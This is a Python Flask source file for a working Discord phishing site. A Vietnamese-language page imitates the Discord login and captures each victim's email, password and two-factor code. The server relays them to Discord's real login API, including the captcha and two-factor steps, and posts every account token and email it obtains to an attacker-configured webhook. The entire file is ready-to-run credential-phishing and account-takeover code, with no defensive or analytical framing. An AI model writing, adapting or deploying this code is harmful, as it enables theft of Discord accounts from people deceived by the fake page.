import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import time

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'random_secret_key_change_me')
CORS(app)

WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

def send_to_webhook(content, token_data=None):
    if not WEBHOOK_URL:
        return
    payload = {'content': content}
    if token_data:
        payload['embeds'] = [{
            'title': 'Discord Token',
            'description': f'```{token_data}```',
            'color': 0x5865F2
        }]
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=2)
    except:
        pass

def discord_login(email, password, captcha_key=None):
    session_req = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Content-Type': 'application/json'}
    payload = {
        'login': email,
        'password': password,
        'undelete': False,
        'captcha_key': captcha_key,
        'login_source': None,
        'gift_code_sku_id': None
    }
    try:
        resp = session_req.post('https://discord.com/api/v9/auth/login', json=payload, headers=headers, timeout=10)
        try:
            data = resp.json()
        except:
            return {'success': False, 'error': 'non_json', 'status': resp.status_code, 'text': resp.text[:500]}
        if resp.status_code == 200:
            token = data.get('token')
            if token:
                send_to_webhook(f'**Login success!**\nEmail: {email}\nToken: ||{token}||', token)
                return {'success': True, 'token': token}
            return {'success': False, 'error': 'no_token'}
        elif resp.status_code == 400:
            if data.get('captcha_key'):
                captcha_data = data.get('captcha_key')
                if isinstance(captcha_data, list) and len(captcha_data) >= 2:
                    sitekey = captcha_data[0]
                    rqdata = captcha_data[1] if len(captcha_data) > 1 else ''
                else:
                    sitekey = '4c672d35-0701-42b2-88c3-78380b0db560'
                    rqdata = ''
                return {'success': False, 'need_captcha': True, 'sitekey': sitekey, 'rqdata': rqdata, 'session_req': session_req, 'email': email, 'password': password}
            elif 'mfa' in str(data).lower():
                ticket = data.get('ticket')
                return {'success': False, 'need_mfa': True, 'ticket': ticket, 'session_req': session_req}
            elif 'verify' in data.get('message', '').lower() or 'unverified' in data.get('message', '').lower():
                return {'success': False, 'error': 'unverified_email'}
            else:
                return {'success': False, 'error': data.get('message', 'invalid_creds')}
        else:
            return {'success': False, 'error': f'http_{resp.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def discord_login_with_captcha(email, password, captcha_key, session_req):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Content-Type': 'application/json'}
    payload = {
        'login': email,
        'password': password,
        'undelete': False,
        'captcha_key': captcha_key,
        'login_source': None,
        'gift_code_sku_id': None
    }
    try:
        resp = session_req.post('https://discord.com/api/v9/auth/login', json=payload, headers=headers, timeout=10)
        data = resp.json()
        if resp.status_code == 200:
            token = data.get('token')
            if token:
                send_to_webhook(f'**Login success after captcha!**\nEmail: {email}\nToken: ||{token}||', token)
                return {'success': True, 'token': token}
            return {'success': False, 'error': 'no_token'}
        elif resp.status_code == 400 and 'mfa' in str(data).lower():
            ticket = data.get('ticket')
            return {'success': False, 'need_mfa': True, 'ticket': ticket, 'session_req': session_req}
        else:
            return {'success': False, 'error': data.get('message', 'invalid_creds')}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def discord_mfa(ticket, code, session_req):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Content-Type': 'application/json'}
    payload = {'code': code, 'ticket': ticket, 'login_source': None, 'gift_code_sku_id': None}
    try:
        resp = session_req.post('https://discord.com/api/v9/auth/mfa/totp', json=payload, headers=headers, timeout=10)
        data = resp.json()
        if resp.status_code == 200:
            token = data.get('token')
            if token:
                send_to_webhook(f'**2FA passed!**\nToken: ||{token}||', token)
                return {'success': True, 'token': token}
        return {'success': False, 'error': data.get('message', 'Invalid MFA code')}
    except Exception as e:
        return {'success': False, 'error': str(e)}

sessions_store = {}

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Discord Login</title><style>body{background:#36393f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Whitney,'Helvetica Neue',Arial,sans-serif}.box{background:#2f3136;padding:32px;border-radius:8px;width:480px;max-width:90%}.box h1,.box h2{color:#fff}.box .sub{color:#b9bbbe;margin-bottom:20px}.input-group{margin-bottom:16px}.input-group label{color:#b9bbbe;display:block;margin-bottom:8px}.input-group input{background:#202225;border:1px solid #040405;border-radius:4px;padding:10px;width:100%;color:#fff;box-sizing:border-box}button{background:#5865f2;border:none;border-radius:4px;padding:12px;width:100%;color:#fff;cursor:pointer;margin-top:8px}.error{color:#f04747;margin-top:8px}.loading{color:#b9bbbe;margin-top:12px}.hidden{display:none}</style>
<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
</head>
<body>
<div class="box" id="loginBox"><h1>Chào mừng trở lại!</h1><div class="sub">Đăng nhập để tiếp tục</div><form id="loginForm"><div class="input-group"><label>Email hoặc Số điện thoại</label><input type="text" id="email" required></div><div class="input-group"><label>Mật khẩu</label><input type="password" id="password" required></div><button type="submit">Đăng nhập</button><div class="error" id="loginError"></div><div class="loading hidden" id="loginLoading">Đang xử lý...</div></form></div>
<div class="box hidden" id="mfaBox"><h2>Xác minh hai yếu tố</h2><p>Nhập mã từ ứng dụng Authenticator</p><form id="mfaForm"><div class="input-group"><label>Mã xác minh</label><input type="text" id="mfaCode" placeholder="000000" maxlength="6" required></div><button type="submit">Xác nhận</button><div class="error" id="mfaError"></div><div class="loading hidden" id="mfaLoading">Đang xác thực...</div></form></div>
<div class="box hidden" id="captchaBox"><h2>Xác minh an toàn</h2><p>Vui lòng hoàn thành kiểm tra bên dưới</p><div id="captchaContainer"></div><button id="verifyCaptchaBtn">Xác nhận</button><div class="error" id="captchaError"></div><div class="loading hidden" id="captchaLoading">Đang kiểm tra...</div></div>
<script>
const API_URL='/api/login';let tempSession=null;let captchaData=null;
document.getElementById('loginForm').addEventListener('submit',async function(e){
    e.preventDefault();
    const email=document.getElementById('email').value;
    const password=document.getElementById('password').value;
    if(!email||!password){document.getElementById('loginError').innerText='Vui lòng điền đầy đủ';return;}
    document.getElementById('loginLoading').classList.remove('hidden');
    document.getElementById('loginError').innerText='';
    try{
        const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'login',email,password})});
        const data=await res.json();
        console.log('Login response:',data);
        if(data.success){
            if(data.token){
                document.getElementById('loginLoading').classList.add('hidden');
                document.getElementById('loginError').innerText='Đăng nhập thành công!';
                setTimeout(()=>{window.location.href='https://discord.com/app';},1500);
            }else if(data.need_mfa){
                tempSession=data.session_id;
                document.getElementById('loginBox').classList.add('hidden');
                document.getElementById('mfaBox').classList.remove('hidden');
                document.getElementById('loginLoading').classList.add('hidden');
            }
        }else if(data.need_captcha){
            captchaData={session_id:data.session_id,sitekey:data.sitekey,rqdata:data.rqdata};
            document.getElementById('loginBox').classList.add('hidden');
            document.getElementById('captchaBox').classList.remove('hidden');
            document.getElementById('loginLoading').classList.add('hidden');
            document.getElementById('captchaContainer').innerHTML='<div class="h-captcha" data-sitekey="'+data.sitekey+'" data-rqdata="'+encodeURIComponent(data.rqdata||'')+'"></div>';
        }else{
            document.getElementById('loginLoading').classList.add('hidden');
            let errMsg=data.error;
            if(errMsg==='unverified_email') errMsg='Tài khoản chưa xác minh email. Vui lòng xác minh trước.';
            else if(errMsg==='invalid_creds') errMsg='Sai email hoặc mật khẩu.';
            document.getElementById('loginError').innerText=errMsg||'Đăng nhập thất bại.';
        }
    }catch(err){
        console.error('Fetch error:',err);
        document.getElementById('loginLoading').classList.add('hidden');
        document.getElementById('loginError').innerText='Lỗi kết nối máy chủ.';
    }
});
document.getElementById('mfaForm').addEventListener('submit',async function(e){
    e.preventDefault();
    const code=document.getElementById('mfaCode').value;
    if(!code||code.length<6){document.getElementById('mfaError').innerText='Nhập mã 6 số';return;}
    document.getElementById('mfaLoading').classList.remove('hidden');
    document.getElementById('mfaError').innerText='';
    try{
        const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'mfa',session_id:tempSession,code})});
        const data=await res.json();
        if(data.success&&data.token){
            document.getElementById('mfaLoading').classList.add('hidden');
            document.getElementById('mfaError').innerText='Xác thực thành công!';
            setTimeout(()=>{window.location.href='https://discord.com/app';},1500);
        }else{
            document.getElementById('mfaLoading').classList.add('hidden');
            document.getElementById('mfaError').innerText=data.error||'Mã không hợp lệ';
        }
    }catch(err){
        document.getElementById('mfaLoading').classList.add('hidden');
        document.getElementById('mfaError').innerText='Lỗi hệ thống';
    }
});
document.getElementById('verifyCaptchaBtn').addEventListener('click',async function(){
    const captchaResponse=hcaptcha.getResponse();
    if(!captchaResponse){document.getElementById('captchaError').innerText='Vui lòng hoàn thành captcha';return;}
    document.getElementById('captchaLoading').classList.remove('hidden');
    document.getElementById('captchaError').innerText='';
    try{
        const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'captcha',session_id:captchaData.session_id,captcha_response:captchaResponse})});
        const data=await res.json();
        if(data.success){
            if(data.token){
                document.getElementById('captchaLoading').classList.add('hidden');
                document.getElementById('captchaError').innerText='Đăng nhập thành công!';
                setTimeout(()=>{window.location.href='https://discord.com/app';},1500);
            }else if(data.need_mfa){
                tempSession=data.session_id;
                document.getElementById('captchaBox').classList.add('hidden');
                document.getElementById('mfaBox').classList.remove('hidden');
                document.getElementById('captchaLoading').classList.add('hidden');
            }
        }else{
            document.getElementById('captchaLoading').classList.add('hidden');
            document.getElementById('captchaError').innerText=data.error||'Captcha không hợp lệ';
        }
    }catch(err){
        document.getElementById('captchaLoading').classList.add('hidden');
        document.getElementById('captchaError').innerText='Lỗi hệ thống';
    }
});
</script>
</body>
</html>
    '''

@app.route('/api/login', methods=['POST'])
def handle_login():
    data = request.json
    step = data.get('step')
    if step == 'login':
        email = data.get('email')
        password = data.get('password')
        if not email or not password:
            return jsonify({'success': False, 'error': 'Missing fields'})
        result = discord_login(email, password)
        if result.get('success'):
            return jsonify({'success': True, 'token': result.get('token')})
        elif result.get('need_captcha'):
            session_id = str(time.time())
            sessions_store[session_id] = {
                'type': 'captcha',
                'email': email,
                'password': password,
                'session_req': result.get('session_req'),
                'sitekey': result.get('sitekey'),
                'rqdata': result.get('rqdata')
            }
            return jsonify({'success': False, 'need_captcha': True, 'session_id': session_id, 'sitekey': result.get('sitekey'), 'rqdata': result.get('rqdata')})
        elif result.get('need_mfa'):
            ticket = result.get('ticket')
            session_req = result.get('session_req')
            session_id = str(time.time())
            sessions_store[session_id] = {'type': 'mfa', 'ticket': ticket, 'session_req': session_req}
            return jsonify({'success': False, 'need_mfa': True, 'session_id': session_id})
        else:
            error_msg = result.get('error', 'invalid_creds')
            if error_msg == 'unverified_email':
                return jsonify({'success': False, 'error': 'unverified_email'})
            elif error_msg == 'invalid_creds':
                return jsonify({'success': False, 'error': 'invalid_creds'})
            else:
                return jsonify({'success': False, 'error': 'Sai email hoặc mật khẩu'})
    elif step == 'captcha':
        session_id = data.get('session_id')
        captcha_response = data.get('captcha_response')
        if not session_id or not captcha_response:
            return jsonify({'success': False, 'error': 'Missing data'})
        if session_id not in sessions_store:
            return jsonify({'success': False, 'error': 'Session expired'})
        sess = sessions_store.pop(session_id)
        if sess.get('type') != 'captcha':
            return jsonify({'success': False, 'error': 'Invalid session'})
        email = sess['email']
        password = sess['password']
        session_req = sess['session_req']
        result = discord_login_with_captcha(email, password, captcha_response, session_req)
        if result.get('success'):
            return jsonify({'success': True, 'token': result.get('token')})
        elif result.get('need_mfa'):
            ticket = result.get('ticket')
            session_req = result.get('session_req')
            new_session_id = str(time.time())
            sessions_store[new_session_id] = {'type': 'mfa', 'ticket': ticket, 'session_req': session_req}
            return jsonify({'success': False, 'need_mfa': True, 'session_id': new_session_id})
        else:
            return jsonify({'success': False, 'error': 'Captcha không hợp lệ hoặc thông tin sai'})
    elif step == 'mfa':
        session_id = data.get('session_id')
        code = data.get('code')
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Missing session or code'})
        if session_id not in sessions_store:
            return jsonify({'success': False, 'error': 'Session expired'})
        sess = sessions_store.pop(session_id)
        if sess.get('type') != 'mfa':
            return jsonify({'success': False, 'error': 'Invalid session'})
        ticket = sess['ticket']
        session_req = sess['session_req']
        result = discord_mfa(ticket, code, session_req)
        if result.get('success'):
            return jsonify({'success': True, 'token': result.get('token')})
        else:
            return jsonify({'success': False, 'error': 'Mã xác minh không đúng'})
    return jsonify({'success': False, 'error': 'Invalid step'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
